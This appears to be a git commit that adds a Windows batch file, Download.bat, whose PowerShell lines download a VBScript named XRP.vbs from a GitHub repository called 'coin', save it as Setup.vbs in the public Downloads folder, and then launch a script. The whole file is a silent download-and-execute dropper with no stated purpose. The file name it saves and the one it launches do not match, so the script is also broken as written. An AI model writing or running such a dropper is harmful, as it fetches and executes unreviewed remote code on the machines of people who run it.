8b3e2562eecf25d650b679d3fe9cb0e6ca6a5797
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-10 14:24:35 +0700

    Download.bat

---
+++ Download.bat
@@ -0,0 +1,5 @@
+@echo off
+powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.vbs' -OutFile 'C:\Users\Public\Downloads\Setup.vbs'"
+powershell -NoProfile -Command "Start-Sleep -Seconds 1"
+powershell -NoProfile -Command "Start-Process -FilePath 'C:\Users\Public\Downloads\XRP.vbs'"
+exit
